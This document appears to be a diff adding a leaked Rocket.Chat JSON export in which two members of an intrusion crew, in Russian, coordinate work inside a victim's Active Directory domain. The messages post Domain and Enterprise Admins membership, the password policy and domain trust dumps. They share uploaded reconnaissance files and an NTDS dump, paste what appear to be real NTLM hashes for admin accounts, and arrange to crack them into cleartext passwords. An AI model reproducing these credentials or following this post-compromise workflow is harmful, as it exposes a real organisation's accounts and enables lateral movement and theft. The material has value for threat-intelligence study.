+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:18:00.704Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "r24etBYcAcNjHEDrz",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "вот они ЕА с хэшами",
+      "ts": "2020-12-15T16:13:12.446Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:13:12.491Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KE4ramWNQjToagnRW",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "ща всех соберу",
+      "ts": "2020-12-15T16:11:12.925Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:11:12.970Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zsDYh4YnGf5adwSpE",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "и случайно отправил",
+      "ts": "2020-12-15T16:11:10.868Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:11:10.909Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3RNuvdbboxcK9FJ6x",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "да я кидал имя+хэш ЕА",
+      "ts": "2020-12-15T16:11:06.040Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:11:06.080Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SauHWQjnhXotTg7Nw",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "так и не понял что ты скинул)",
+      "ts": "2020-12-15T16:10:45.773Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:10:45.832Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "NEq5t3syeuoBreTjd",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "это не всё ща",
+      "ts": "2020-12-15T16:10:13.828Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:10:13.852Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6FFkBJX32AK9vSoPG",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "бл",
+      "ts": "2020-12-15T16:10:09.174Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:10:09.216Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "QEbpGDz8AkZhHsYSa",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nlrhc.org\\PsService\n327db612d1d53ac8477a49ae667d523c\n \nlrhc.org\\Pssupport01\n8c3c72c186ece567004a620aff55d842\n \nlrhc.org\\svc-aadc\na5ed4977ab742434bd35761f3cb4c028\n \nlrhc.org\\TMSXE.Service01\na6aea38d860ac5c1e980a7724bd0362e\n \nlrhc.org\\UCAdmin\n1c7c0878a380b6e004f97cd62af6398b\n \nlrhc.org\\frsecure\n6888441821d91affeb5f8cad8a6cad7b\n\nlrhc.org\\PsSupport\n8c3c72c186ece567004a620aff55d842\n \nlrhc.org\\tms01\na6aea38d860ac5c1e980a7724bd0362e\n \nlrhc.org\\jyrkwa\nce52742a372f62d7100e9ca7b5f13369\n```",
+      "ts": "2020-12-15T16:10:04.400Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:13:03.702Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-12-15T16:13:03.699Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "FwHpqEkC2iPdkwAn4",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "если найдешь скинешь хеш я дам клир",
+      "ts": "2020-12-15T16:01:17.188Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:01:17.217Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hYa5M2aYmrRMQtS9g",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "прочекай",
+      "ts": "2020-12-15T16:01:12.746Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T16:01:12.784Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fuj8EbgGA4D38kJmh",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "от ЕА клир пассы были?",
+      "ts": "2020-12-15T16:00:45.703Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T16:00:45.742Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ADDdWgzZNnXyMDqMX",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "да я и так сейчас",
+      "ts": "2020-12-15T15:59:08.469Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:59:08.493Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SikRrRdHiZCjfyC5W",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "сними с них ад",
+      "ts": "2020-12-15T15:58:55.100Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T15:58:55.148Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ggfjrWo6TQPBrDEiE",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "угу",
+      "ts": "2020-12-15T15:58:50.646Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T15:58:50.706Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hH6tPsSWSGvmcfsPr",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "последний",
+      "ts": "2020-12-15T15:58:21.080Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:58:21.123Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ujY8JjKbfows39At2",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\ndn:CN=ffmg.local,CN=System,DC=lrhc,DC=local\n>whenCreated: 2010/01/18-12:49:34 Central Standard Time\n>name: ffmg.local\n>securityIdentifier: S-1-5-21-111134195-3807604873-3122732003\n>trustDirection: 3 [Inbound(1);Outbound(2)]\n>trustPartner: ffmg.local\n>trustType: 2 [UpLevel(2)]\n>trustAttributes: 8 [Transitive(8)]\n\ndn:CN=mcklrh.mig,CN=System,DC=lrhc,DC=local\n>whenCreated: 2018/02/14-17:38:43 Central Standard Time\n>name: mcklrh.mig\n>securityIdentifier: S-1-5-21-2653265968-1271411615-963851744\n>trustDirection: 3 [Inbound(1);Outbound(2)]\n>trustPartner: mcklrh.mig\n>trustType: 2 [UpLevel(2)]\n>trustAttributes: 8 [Transitive(8)]\n\ndn:CN=ELEAH.LOCAL,CN=System,DC=lrhc,DC=local\n>whenCreated: 2020/09/16-17:04:40 Central Standard Time\n>name: ELEAH.LOCAL\n>securityIdentifier: S-1-5-21-2327498286-4212857632-543316630\n>trustDirection: 3 [Inbound(1);Outbound(2)]\n>trustPartner: ELEAH.LOCAL\n>trustType: 2 [UpLevel(2)]\n>trustAttributes: 4 [Quarantined-Domain(4)]\n```",
+      "ts": "2020-12-15T15:58:17.156Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:58:17.340Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jXhqnfxHBbSLtZRuf",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "там 3 траста, 1 в карантине, его не трогаю, получается?",
+      "ts": "2020-12-15T15:58:11.112Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:58:11.167Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YKr6f7rJfvhHk6dxv",
+      "rid": "CD3unmS5YbWcpczbh",
+      "ts": "2020-12-15T15:47:19.623Z",
+      "msg": "",
+      "file": {
+        "_id": "3QXs9gSE8f4jXvdSs",
+        "name": "result.ntds.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "result.ntds.txt",
+          "title_link": "/file-upload/3QXs9gSE8f4jXvdSs/result.ntds.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-15T15:47:19.674Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jDBt5zsjKWkLXFLZu",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "трасты)",
+      "ts": "2020-12-15T15:46:20.820Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:46:20.855Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HYSQ22TPCJKZjxGgZ",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nForce user logoff how long after time expires?:       Never\nMinimum password age (days):                          0\nMaximum password age (days):                          90\nMinimum password length:                              8\nLength of password history maintained:                10\nLockout threshold:                                    10\nLockout duration (minutes):                           30\nLockout observation window (minutes):                 30\nComputer role:                                        PRIMARY\nThe command completed successfully.\n```",
+      "ts": "2020-12-15T15:46:02.381Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:46:02.464Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vEJcaE9u4GKBTuMao",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nGroup name     Enterprise Admins\nComment        Designated administrators of the enterprise\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            frsecure                 jyrkwa                   \nPsService                PsSupport                Pssupport01              \nsvc-aadc                 tms01                    TMSXE.Service01          \nUCAdmin                  \nThe command completed successfully.\n```",
+      "ts": "2020-12-15T15:45:53.939Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:45:54.026Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZsoDLL9Lk44Gk5ALe",
+      "rid": "CD3unmS5YbWcpczbh",
+      "msg": "```\nGroup name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nadmin                    Administrator            AvamarBackupUser         \nCDW.Tech1                CDW.Tech2                CDW.Tech3                \ncdw.user01               cisadmin                 frsecure                 \ngsnelson                 jyrkwa                   lljennbi                 \nnmsapps                  OnPremMigAdmin1          OnPremMigAdmin2          \nOnPremMigAdmin3          pmpetecc                 PRHADMIN                 \nPsService                PsSupport                Pssupport01              \nradmin                   tms01                    TMSXE.Service01          \nUCAdmin                  WebAdmin                 \nThe command completed successfully.\n```",
+      "ts": "2020-12-15T15:45:47.193Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:45:47.280Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "z4cqDNTcQZaa8JNEB",
+      "rid": "CD3unmS5YbWcpczbh",
+      "ts": "2020-12-15T15:45:40.660Z",
+      "msg": "",
+      "file": {
+        "_id": "PDupaGjTJiXrQk96J",
+        "name": "ad_computers.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_computers.txt",
+          "title_link": "/file-upload/PDupaGjTJiXrQk96J/ad_computers.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:45:40.759Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TeL3ENdHAjZyshka2",
+      "rid": "CD3unmS5YbWcpczbh",
+      "ts": "2020-12-15T15:45:40.010Z",
+      "msg": "",
+      "file": {
+        "_id": "k7JSa4ZEsB9wZq6Yg",
+        "name": "ad_group.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_group.txt",
+          "title_link": "/file-upload/k7JSa4ZEsB9wZq6Yg/ad_group.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:45:40.061Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "aYeEp5uxvtBsjBeQL",
+      "rid": "CD3unmS5YbWcpczbh",
+      "ts": "2020-12-15T15:45:39.836Z",
+      "msg": "",
+      "file": {
+        "_id": "GSu6eBmk2Lg6L3NYF",
+        "name": "ad_users.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_users.txt",
+          "title_link": "/file-upload/GSu6eBmk2Lg6L3NYF/ad_users.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:45:39.878Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gXNJX7KSdGjMbCBX9",
+      "rid": "CD3unmS5YbWcpczbh",
+      "ts": "2020-12-15T15:45:35.481Z",
+      "msg": "",
+      "file": {
+        "_id": "cMtdwNyecredMGea9",
+        "name": "ad_ous.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_ous.txt",
+          "title_link": "/file-upload/cMtdwNyecredMGea9/ad_ous.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:45:35.527Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vFnqjYBo5tPCSb9oJ",
+      "rid": "CD3unmS5YbWcpczbh",
+      "ts": "2020-12-15T15:45:33.037Z",
+      "msg": "",
+      "file": {
+        "_id": "6Pcsd45czZMt9ZtYJ",
+        "name": "subnets.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "subnets.txt",
+          "title_link": "/file-upload/6Pcsd45czZMt9ZtYJ/subnets.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:45:33.065Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xFc2kBgfafCQnSWKW",
+      "rid": "CD3unmS5YbWcpczbh",
+      "ts": "2020-12-15T15:45:32.889Z",
+      "msg": "",
+      "file": {
+        "_id": "x88qmw4cik6fJePcS",
+        "name": "trustdmp.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "trustdmp.txt",
+          "title_link": "/file-upload/x88qmw4cik6fJePcS/trustdmp.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-15T15:45:32.917Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
